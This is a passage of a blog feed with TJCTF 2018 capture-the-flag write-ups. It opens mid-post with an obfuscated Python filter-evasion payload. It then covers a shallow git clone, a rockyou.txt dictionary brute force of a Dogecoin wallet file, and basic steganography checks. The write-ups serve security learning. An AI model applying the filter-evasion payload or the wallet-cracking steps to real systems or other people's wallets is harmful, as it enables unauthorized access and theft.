&amp;gt;&amp;gt;&amp;gt; get_flag(&quot;`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~(((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&quot;)
tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Phew! Got it, finally! The flag was : &lt;code class=&quot;highlighter-rouge&quot;&gt;tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;

&lt;p&gt;I maybe made it sound easy or quick writing this, but it actually took me a few hours to figure this all out. As it was my first time, I definitly needed some help and advices, and that’s where &lt;a href=&quot;https://twitter.com/highsenburger69&quot;&gt;Highsenburger69&lt;/a&gt; came handy. Shout out to you, lovely bastard! :heart:&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="misc" /><summary type="html"></summary></entry><entry><title type="html">TJCTF - Huuuuuge</title><link href="/2018/08/12/TJCTF-Write-Up-Huuuuuge/" rel="alternate" type="text/html" title="TJCTF - Huuuuuge" /><published>2018-08-12T02:00:04+02:00</published><updated>2018-08-12T02:00:04+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-Huuuuuge</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-Huuuuuge/">&lt;!-- more --&gt;

&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;

&lt;p&gt;Don’t think too deep.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;104.154.187.226/huuuuuge&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;[25 points]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Written by Alaska47&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-thoughts&quot;&gt;Initial thoughts&lt;/h2&gt;

&lt;p&gt;Uh. They’re giving us an IP address with an extension (/xxx) which probably means it’s web. But then, why classify this challenge as misc’?&lt;/p&gt;

&lt;p&gt;Let’s find out.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;First of all, let’s fire up nmap and gather information about 104.154.187.226.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 25:97:23:e0:26:26:07:2e:f6:38:20:90:ce:39:44:96 (RSA)
|   256 66:2e:64:31:21:83:68:03:2b:05:30:05:7a:59:72:df (ECDSA)
|_  256 25:61:dd:51:b8:43:76:47:ba:96:16:fe:cd:09:e0:04 (ED25519)
80/tcp   closed http
5901/tcp closed vnc-1
9418/tcp open   git?
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Interesting. It’s not a web server after all. I immediately thought that this git opened port was looking weird. Well, let’s try to interact with it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# git clone 104.154.187.226/huuuuuge
fatal: repository '104.154.187.226/huuuuuge' does not exist
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Err. Silly me. I forgot the extension, plus : it’s not a web server, so I gotta tell my git where to look and HOW to look.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# git clone git://104.154.187.226/huuuuuge
Cloning into 'huuuuuge'...
remote: Counting objects: 309, done.
remote: warning: suboptimal pack - out of memory
remote: fatal: Out of memory, malloc failed (tried to allocate 104857601 bytes)
remote: aborting due to possible repository corruption on the remote side.
fatal: early EOF
fatal: index-pack failed
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;God damn, this thing is massive! Wait… Challenge name’s Huuuuuge… I see what they did here…&lt;/p&gt;

&lt;p&gt;Let’s look at &lt;strong&gt;git clone&lt;/strong&gt;’s manual :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--depth &amp;lt;depth&amp;gt;
Create a shallow clone with a history truncated to the specified number of commits. Implies --single-branch unless --no-single-branch is given to fetch the histories near the tips of all branches. If you want to clone submodules shallowly, also pass --shallow-submodules.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Interesting… Let’s try something then, just to see what comes out!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# git clone --depth 1 git://104.154.187.226/huuuuuge
Cloning into 'huuuuuge'...
remote: Counting objects: 3, done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (3/3), done.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Uh, uh! We got the first line. Let’s open it and see what lies for us there.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# cd huuuuuge/
~/huuuuuge# ls
flag.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;How nice of them to give us a flag like that! You gotta love TJCTF.&lt;/p&gt;

&lt;p&gt;The flag was : &lt;code class=&quot;highlighter-rouge&quot;&gt;tjctf{this_fl4g_1s_huuuuuge}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;

&lt;p&gt;Very interesting challenge as I never had encountered this case before of a “too big to clone” git repo. I really like challenges that make you learn new things, and this includes the ones that make you read a command’s manual.&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="misc" /><summary type="html"></summary></entry><entry><title type="html">TJCTF - We Will Rock You</title><link href="/2018/08/12/TJCTF-Write-Up-We-Will-Rock-You/" rel="alternate" type="text/html" title="TJCTF - We Will Rock You" /><published>2018-08-12T02:00:03+02:00</published><updated>2018-08-12T02:00:03+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-We-Will-Rock-You</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-We-Will-Rock-You/">&lt;!-- more --&gt;

&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;

&lt;p&gt;Help! I lost the password to my Dogecoin wallet. I had like 10 Dogecoin in there. If you get the password, you’ll get the flag! Flag format: tjctf{password}&lt;/p&gt;

&lt;p&gt;[75 points]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Written by Alaska47&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-thoughts&quot;&gt;Initial thoughts&lt;/h2&gt;

&lt;p&gt;Seeing the name of the challenge, I immediately thought about the &lt;em&gt;infamous&lt;/em&gt; rockyou.txt list of passwords. For those of you who don’t know it, it’s this huge list of passwords that was created out of real, leaked passwords.&lt;/p&gt;

&lt;p&gt;It’s natively present in Kali, check &lt;em&gt;/usr/share/wordlists&lt;/em&gt; and you’ll find a &lt;em&gt;rockyou.txt.gz&lt;/em&gt; :)&lt;/p&gt;

&lt;p&gt;So I assumed I’d have to bruteforce this wallet in order to retrieve the password. I googled for “wallet bruteforce” and found glv2’s &lt;a href=&quot;https://github.com/glv2/bruteforce-wallet&quot; title=&quot;Click here to learn more!&quot;&gt;Github magic thingy&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;First off, let’s clone this github repo.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# git clone https://github.com/glv2/bruteforce-wallet
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Let’s install the dependencies required :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# apt install libdb-dev libssl-dev -y
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Let’s then try to install it following the README’s instructions.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# cd bruteforce-wallet &amp;amp;&amp;amp; ./autogen.sh
./autogen.sh: 6: ./autogen.sh: autoreconf: not found
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Oops! Seems I need to install a package first.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# apt-get install autoconf
~# ./autogen.sh
configure.ac:6: installing './compile'
configure.ac:2: installing './install-sh'
configure.ac:2: installing './missing'
Makefile.am: installing './depcomp'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Then a ./configure, make and make install and we’re good! Now, let’s use our new little tool :3&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# bruteforce-wallet -t 6 -f /root/Documents/rockyou.txt 9d7e6203fb6e2c14646c63bea94e48001b9317c86bec229c3e063904a168dfad_wallet.dat
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
 
Tried passwords: 59
Tried passwords per second: 59,000000
Last tried password: samantha
 
Password found: tinkerbell
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Got it! Password is “tinkerbell”, hereby flag is : &lt;code class=&quot;highlighter-rouge&quot;&gt;tjctf{tinkerbell}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;

&lt;p&gt;A very basic challenge worth a lot of points compared to other ones in this TJCTF. Still, I enjoyed the five minutes it took me, as I never had to bruteforce a coin-wallet before. Valuable experience!&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="forensics" /><summary type="html"></summary></entry><entry><title type="html">TJCTF - Weird Logo</title><link href="/2018/08/12/TJCTF-Write-Up-Weird-Logo/" rel="alternate" type="text/html" title="TJCTF - Weird Logo" /><published>2018-08-12T02:00:02+02:00</published><updated>2018-08-12T02:00:02+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-Weird-Logo</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-Weird-Logo/">&lt;!-- more --&gt;

&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;

&lt;p&gt;This company’s logo stands in contrast of those of other leading edge tech companies with its poor design&lt;/p&gt;

&lt;p&gt;[5 points]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Written by jfrucht25&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-thoughts&quot;&gt;Initial thoughts&lt;/h2&gt;

&lt;p&gt;Having a static .png image with this little amount of points rewarded means it won’t be tough.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;Let’s start with the basics. The “file” command tells us it is indeed a .png. The “binwalk” and “strings” commands give us nothing interesting. Next step? Stegsolve!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/zardus/ctf-tools/blob/master/stegsolve/install&quot;&gt;You can install it here.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is our beautiful logo :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/imgs/before.png&quot; alt=&quot;Before&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here is what we can find with just a few switches to the right :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/imgs/after.png&quot; alt=&quot;After&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;tjctf{in_plain_sight}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;

&lt;p&gt;Not much. This is the very basic of steganography. I’ve encountered it dozens of times in past CTFs.&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="forensics" /><summary type="html"></summary></entry><entry><title type="html">TJCTF - Trippy</title><link href="/2018/08/12/TJCTF-Write-Up-Trippy/" rel="alternate" type="text/html" title="TJCTF - Trippy" /><published>2018-08-12T02:00:01+02:00</published><updated>2018-08-12T02:00:01+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-Trippy</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-Trippy/">&lt;!-- more --&gt;

&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;

&lt;p&gt;No description&lt;/p&gt;

&lt;p&gt;[5 points]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Written by Alaska47&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-thoughts&quot;&gt;Initial thoughts&lt;/h2&gt;

&lt;p&gt;So, we have no description and a gif file. All of this for little to no points. This should be quick.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# wget https://static.tjctf.org/be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif
 
~# strings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctf
tjctf{w0w}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Meh.&lt;/p&gt;

&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;tjctf{w0w}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;

&lt;p&gt;Not much.&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="misc" /><summary type="html"></summary></entry></feed>